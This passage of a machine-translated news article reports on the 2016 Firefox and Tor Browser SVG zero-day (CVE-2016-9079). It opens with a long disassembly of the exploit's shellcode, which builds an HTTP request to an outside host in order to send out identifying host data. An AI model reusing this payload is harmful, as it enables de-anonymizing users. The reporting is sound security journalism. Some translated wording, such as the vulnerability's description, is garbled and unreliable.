class="hljs-number">0x1</span></span> bytes <span class="hljs-number"><span class="hljs-number">00000257</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>DBDE9020000 lea edi,[ebp+<span class="hljs-number"><span class="hljs-number">0x2e9</span></span>] <span class="hljs-number"><span class="hljs-number">0000025</span></span>D E8E4FFFFFF <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-number"><span class="hljs-number">0x246</span></span> <span class="hljs-number"><span class="hljs-number">00000262</span></span> <span class="hljs-number"><span class="hljs-number">4</span></span>F <span class="hljs-type"><span class="hljs-type">dec</span></span> edi <span class="hljs-number"><span class="hljs-number">00000263</span></span> B94F000000 mov ecx,<span class="hljs-number"><span class="hljs-number">0x4f</span></span> <span class="hljs-number"><span class="hljs-number">00000268</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>DB575020000 lea esi,[ebp+<span class="hljs-number"><span class="hljs-number">0x275</span></span>] <span class="hljs-number"><span class="hljs-number">0000026</span></span>E F3A4 rep movsb <span class="hljs-number"><span class="hljs-number">00000270</span></span> <span class="hljs-number"><span class="hljs-number">8</span></span>DBDE9020000 lea edi,[ebp+<span class="hljs-number"><span class="hljs-number">0x2e9</span></span>] <span class="hljs-number"><span class="hljs-number">00000276</span></span> E8CBFFFFFF <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-number"><span class="hljs-number">0x246</span></span> <span class="hljs-number"><span class="hljs-number">0000027</span></span>B C3 ret <span class="hljs-number"><span class="hljs-number">0000027</span></span>C <span class="hljs-number"><span class="hljs-number">0</span></span>D0A436F6E <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> eax,<span class="hljs-number"><span class="hljs-number">0x6e6f430a</span></span> <span class="hljs-number"><span class="hljs-number">00000281</span></span> <span class="hljs-number"><span class="hljs-number">6</span></span>E outsb <span class="hljs-number"><span class="hljs-number">00000282</span></span> <span class="hljs-number"><span class="hljs-number">656374696</span></span>F arpl [gs:ecx+ebp*<span class="hljs-number"><span class="hljs-number">2</span></span>+<span class="hljs-number"><span class="hljs-number">0x6f</span></span>],si <span class="hljs-number"><span class="hljs-number">00000287</span></span> <span class="hljs-number"><span class="hljs-number">6</span></span>E outsb <span class="hljs-number"><span class="hljs-number">00000288</span></span> <span class="hljs-number"><span class="hljs-number">3</span></span>A20 cmp ah,[eax] <span class="hljs-number"><span class="hljs-number">0000028</span></span>A <span class="hljs-number"><span class="hljs-number">6</span></span>B656570 imul esp,[ebp+<span class="hljs-number"><span class="hljs-number">0x65</span></span>],byte +<span class="hljs-number"><span class="hljs-number">0x70</span></span> <span class="hljs-number"><span class="hljs-number">0000028</span></span>E <span class="hljs-number"><span class="hljs-number">2</span></span>D616C6976 sub eax,<span class="hljs-number"><span class="hljs-number">0x76696c61</span></span> <span class="hljs-number"><span class="hljs-number">00000293</span></span> <span class="hljs-number"><span class="hljs-number">650</span></span>D0A416363 gs <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> eax,<span class="hljs-number"><span class="hljs-number">0x6363410a</span></span> <span class="hljs-number"><span class="hljs-number">00000299</span></span> <span class="hljs-number"><span class="hljs-number">657074</span></span> gs jo <span class="hljs-number"><span class="hljs-number">0x310</span></span> <span class="hljs-number"><span class="hljs-number">0000029</span></span>C <span class="hljs-number"><span class="hljs-number">3</span></span>A20 cmp ah,[eax] <span class="hljs-number"><span class="hljs-number">0000029</span></span>E <span class="hljs-number"><span class="hljs-number">2</span></span>A2F sub ch,[edi] <span class="hljs-number"><span class="hljs-number">000002</span></span>A0 <span class="hljs-number"><span class="hljs-number">2</span></span>A0D0A416363 sub cl,[<span class="hljs-number"><span class="hljs-number">0x6363410a</span></span>] <span class="hljs-number"><span class="hljs-number">000002</span></span>A6 <span class="hljs-number"><span class="hljs-number">657074</span></span> gs jo <span class="hljs-number"><span class="hljs-number">0x31d</span></span> <span class="hljs-number"><span class="hljs-number">000002</span></span>A9 <span class="hljs-number"><span class="hljs-number">2</span></span>D456E636F sub eax,<span class="hljs-number"><span class="hljs-number">0x6f636e45</span></span> <span class="hljs-number"><span class="hljs-number">000002</span></span>AE <span class="hljs-number"><span class="hljs-number">64696E673</span></span>A20677A imul ebp,[fs:esi+<span class="hljs-number"><span class="hljs-number">0x67</span></span>],dword <span class="hljs-number"><span class="hljs-number">0x7a67203a</span></span> <span class="hljs-number"><span class="hljs-number">000002</span></span>B6 <span class="hljs-number"><span class="hljs-number">69700</span></span>D0A0D0A00 imul esi,[eax+<span class="hljs-number"><span class="hljs-number">0xd</span></span>],dword <span class="hljs-number"><span class="hljs-number">0xa0d0a</span></span> <span class="hljs-number"><span class="hljs-number">000002</span></span>BD <span class="hljs-number"><span class="hljs-number">83</span></span>C70E <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> edi,byte +<span class="hljs-number"><span class="hljs-number">0xe</span></span> <span class="hljs-number"><span class="hljs-number">000002</span></span>C0 <span class="hljs-number"><span class="hljs-number">31</span></span>C9 xor ecx,ecx <span class="hljs-number"><span class="hljs-number">000002</span></span>C2 F7D1 <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ecx <span class="hljs-number"><span class="hljs-number">000002</span></span>C4 <span class="hljs-number"><span class="hljs-number">31</span></span>C0 xor eax,eax <span class="hljs-number"><span class="hljs-number">000002</span></span>C6 F3AE repe scasb <span class="hljs-number"><span class="hljs-number">000002</span></span>C8 <span class="hljs-number"><span class="hljs-number">4</span></span>F <span class="hljs-type"><span class="hljs-type">dec</span></span> edi <span class="hljs-number"><span class="hljs-number">000002</span></span>C9 FFE7 jmp edi <span class="hljs-number"><span class="hljs-number">000002</span></span>CB <span class="hljs-number"><span class="hljs-number">0</span></span>D0A436F6F <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> eax,<span class="hljs-number"><span class="hljs-number">0x6f6f430a</span></span> <span class="hljs-number"><span class="hljs-number">000002</span></span>D0 <span class="hljs-number"><span class="hljs-number">6</span></span>B69653A imul ebp,[ecx+<span class="hljs-number"><span class="hljs-number">0x65</span></span>],byte +<span class="hljs-number"><span class="hljs-number">0x3a</span></span> <span class="hljs-number"><span class="hljs-number">000002</span></span>D4 <span class="hljs-number"><span class="hljs-number">204944</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> [ecx+<span class="hljs-number"><span class="hljs-number">0x44</span></span>],cl <span class="hljs-number"><span class="hljs-number">000002</span></span>D7 <span class="hljs-number"><span class="hljs-number">3</span></span>D7773325F cmp eax,<span class="hljs-number"><span class="hljs-number">0x5f327377</span></span> <span class="hljs-number"><span class="hljs-number">000002</span></span>DC <span class="hljs-number"><span class="hljs-number">3332</span></span> xor esi,[edx] <span class="hljs-number"><span class="hljs-number">000002</span></span>DE <span class="hljs-number"><span class="hljs-number">004950</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [ecx+<span class="hljs-number"><span class="hljs-number">0x50</span></span>],cl <span class="hljs-number"><span class="hljs-number">000002E1</span></span> <span class="hljs-number"><span class="hljs-number">48</span></span> <span class="hljs-type"><span class="hljs-type">dec</span></span> eax <span class="hljs-number"><span class="hljs-number">000002E2</span></span> <span class="hljs-number"><span class="hljs-number">4</span></span>C <span class="hljs-type"><span class="hljs-type">dec</span></span> esp <span class="hljs-number"><span class="hljs-number">000002E3</span></span> <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000002E4</span></span> <span class="hljs-number"><span class="hljs-number">41</span></span> inc ecx <span class="hljs-number"><span class="hljs-number">000002E5</span></span> <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000002E6</span></span> <span class="hljs-number"><span class="hljs-number">49</span></span> <span class="hljs-type"><span class="hljs-type">dec</span></span> ecx <span class="hljs-number"><span class="hljs-number">000002E7</span></span> <span class="hljs-number"><span class="hljs-number">0002</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [edx],al <span class="hljs-number"><span class="hljs-number">000002E9</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000002</span></span>EB <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">000002</span></span>EC <span class="hljs-number"><span class="hljs-number">41</span></span> inc ecx <span class="hljs-number"><span class="hljs-number">000002</span></span>ED DECA fmulp st2 <span class="hljs-number"><span class="hljs-number">000002</span></span>EF <span class="hljs-number"><span class="hljs-number">3647</span></span> ss inc edi <span class="hljs-number"><span class="hljs-number">000002</span></span>F1 <span class="hljs-number"><span class="hljs-number">45</span></span> inc ebp <span class="hljs-number"><span class="hljs-number">000002</span></span>F2 <span class="hljs-number"><span class="hljs-number">54</span></span> push esp <span class="hljs-number"><span class="hljs-number">000002</span></span>F3 <span class="hljs-number"><span class="hljs-number">202</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> [edi],ch <span class="hljs-number"><span class="hljs-number">000002</span></span>F5 <span class="hljs-number"><span class="hljs-number">303563656134</span></span> xor [<span class="hljs-number"><span class="hljs-number">0x34616563</span></span>],dh <span class="hljs-number"><span class="hljs-number">000002</span></span>FB <span class="hljs-number"><span class="hljs-number">64652</span></span>D39353164 gs sub eax,<span class="hljs-number"><span class="hljs-number">0x64313539</span></span> <span class="hljs-number"><span class="hljs-number">00000302</span></span> <span class="hljs-number"><span class="hljs-number">2</span></span>D34303337 sub eax,<span class="hljs-number"><span class="hljs-number">0x37333034</span></span> <span class="hljs-number"><span class="hljs-number">00000307</span></span> <span class="hljs-number"><span class="hljs-number">2</span></span>D62663866 sub eax,<span class="hljs-number"><span class="hljs-number">0x66386662</span></span> <span class="hljs-number"><span class="hljs-number">0000030</span></span>C <span class="hljs-number"><span class="hljs-number">2</span></span>D66363930 sub eax,<span class="hljs-number"><span class="hljs-number">0x30393666</span></span> <span class="hljs-number"><span class="hljs-number">00000311</span></span> <span class="hljs-number"><span class="hljs-number">3535623237</span></span> xor eax,<span class="hljs-number"><span class="hljs-number">0x37326235</span></span> <span class="hljs-number"><span class="hljs-number">00000316</span></span> <span class="hljs-number"><span class="hljs-number">396262</span></span> cmp [edx+<span class="hljs-number"><span class="hljs-number">0x62</span></span>],esp <span class="hljs-number"><span class="hljs-number">00000319</span></span> <span class="hljs-number"><span class="hljs-number">204854</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> [eax+<span class="hljs-number"><span class="hljs-number">0x54</span></span>],cl <span class="hljs-number"><span class="hljs-number">0000031</span></span>C <span class="hljs-number"><span class="hljs-number">54</span></span> push esp <span class="hljs-number"><span class="hljs-number">0000031</span></span>D <span class="hljs-number"><span class="hljs-number">50</span></span> push eax <span class="hljs-number"><span class="hljs-number">0000031</span></span>E <span class="hljs-number"><span class="hljs-number">2</span></span>F das <span class="hljs-number"><span class="hljs-number">0000031</span></span>F <span class="hljs-number"><span class="hljs-number">312</span></span>E xor [esi],ebp <span class="hljs-number"><span class="hljs-number">00000321</span></span> <span class="hljs-number"><span class="hljs-number">310</span></span>D0A486F73 xor [<span class="hljs-number"><span class="hljs-number">0x736f480a</span></span>],ecx <span class="hljs-number"><span class="hljs-number">00000327</span></span> <span class="hljs-number"><span class="hljs-number">743</span></span>A jz <span class="hljs-number"><span class="hljs-number">0x363</span></span> <span class="hljs-number"><span class="hljs-number">00000329</span></span> <span class="hljs-number"><span class="hljs-number">2000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000032</span></span>B <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000032</span></span>D <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000032</span></span>F <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000331</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000333</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000335</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000337</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000339</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000033</span></span>B <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000033</span></span>D <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000033</span></span>F <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000341</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000343</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000345</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000347</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000349</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000034</span></span>B <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000034</span></span>D <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000034</span></span>F <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000351</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000353</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000355</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000357</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000359</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000035</span></span>B <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000035</span></span>D <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000035</span></span>F <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000361</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000363</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000365</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000367</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000369</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000036</span></span>B <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000036</span></span>D <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000036</span></span>F <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000371</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000373</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000375</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000377</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000379</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000037</span></span>B <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000037</span></span>D <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000037</span></span>F <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000381</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000383</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000385</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000387</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000389</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000038</span></span>B <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000038</span></span>D <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000038</span></span>F <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000391</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000393</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000395</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000397</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">00000399</span></span> <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000039</span></span>B <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000039</span></span>D <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">0000039</span></span>F <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>A1 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>A3 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>A5 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>A7 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>A9 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>AB <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>AD <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>AF <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>B1 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>B3 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>B5 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>B7 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>B9 <span class="hljs-number"><span class="hljs-number">0000</span></span> <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> [eax],al <span class="hljs-number"><span class="hljs-number">000003</span></span>BB <span class="hljs-number"><span class="hljs-number">90</span></span> nop</code> </pre> </div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mozilla security officer Daniel Veditz says that the similarity of the 2013 and 2016 exploit code caused rumors that law enforcement and intelligence agencies were again involved in the de-anonymization of Tor users. But at this time it is not known for sure. Nevertheless, if this exploit was again developed by the special services, and now it is in open access and accessible for use by everyone, then this again demonstrates that the government‚Äôs actions to conceal vulnerabilities for use in their needs are a security threat to all Internet users. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The new version of Firefox with the patch has a version number of </font></font><a href="https://www.mozilla.org/en-US/security/advisories/mfsa2016-92/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">50.0.2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (Firefox ESR 45.5.1 and Thunderbird 45.5.1 are also patched). The accompanying information contains the number of the closed vulnerability </font></font><a href="https://bugzilla.mozilla.org/show_bug.cgi%3Fid%3D1321066"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE-2016-9079</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">("Critical"). Separately released </font></font><a href="https://www.mozilla.org/en-US/security/advisories/mfsa2016-92/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">security recommendation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> from Mozilla. It says that the exploit also works in the Thunderbird mail client and in the browser version with long-lasting support for Firefox ESR. The exploit exploits a memory after exploit vulnerability by SVG Animation, citing </font></font><a href="https://bugzilla.mozilla.org/show_bug.cgi%3Fid%3D1321066"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bug 1321066</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (Iterator invalidation in nsSMILTimeContainer :: NotifyTimeChange ()). There is also an example of an exploit ( </font></font><a href="https://bugzilla.mozilla.org/attachment.cgi%3Fid%3D8815435"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">zip archive</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ), a </font></font><a href="https://bug1321066.bmoattachments.org/attachment.cgi%3Fid%3D8815445"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">log from the</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Firefox 50.0.1 </font><a href="https://bug1321066.bmoattachments.org/attachment.cgi%3Fid%3D8815445"><font style="vertical-align: inherit;">browser</font></a><font style="vertical-align: inherit;"> after the exploit, a </font></font><a href="https://bugzilla.mozilla.org/attachment.cgi%3Fid%3D8815446"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">log from Firefox Nightly,</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and a </font><font style="vertical-align: inherit;">Firefox crash </font></font><a href="https://youtu.be/4vMopBX4mTs"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">video</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/4vMopBX4mTs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In the bug discussion thread in the Mozilla bug tracker </font></font><a href="https://bugzilla.mozilla.org/show_bug.cgi%3Fid%3D1321066"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, it was estimated</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> that this code in the browser remained unchanged for about five years. </font><font style="vertical-align: inherit;">Accordingly, the Firefox and Tor browsers were vulnerable to this type of attack for about the same amount of time. </font><font style="vertical-align: inherit;">And we can conclude that the vulnerability is present in all forks, modifications, Firefox branches and alternative browsers made on the basis of the Firefox code. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In addition to updating the browser, yesterday Tor released an update to the NoScript extension for Firefox (NoScript 2.9.5.2).</font></font></div><p>Source: <a href="https://habr.com/ru/post/316608/">https://habr.com/ru/post/316608/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../316596/index.html">Typical backup errors and how to avoid them. Part two</a></li>
<li><a href="../316598/index.html">Since December 7, Google transfers all G Suite accounts (formerly Google Apps) in Russia to commercial status.</a></li>
<li><a href="../316602/index.html">View globals in the Cach√© Database Management Portal</a></li>
<li><a href="../316604/index.html">The important thing is inside: about procedural generation of organs</a></li>
<li><a href="../316606/index.html">Front-end JavaScript framework Evolution beta</a></li>
<li><a href="../316610/index.html">Double your money in December! New Year's Eve action on "My Circle"</a></li>
<li><a href="../316616/index.html">How we participated in the HR hackathon. Our graduates share their decision and impressions of participation.</a></li>
<li><a href="../316618/index.html">9 ways to optimize front-end performance</a></li>
<li><a href="../316620/index.html">As I opened the Dota-league. Part 2</a></li>
<li><a href="../316622/index.html">FIAS addresses in the PostgreSQL environment. Part 3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

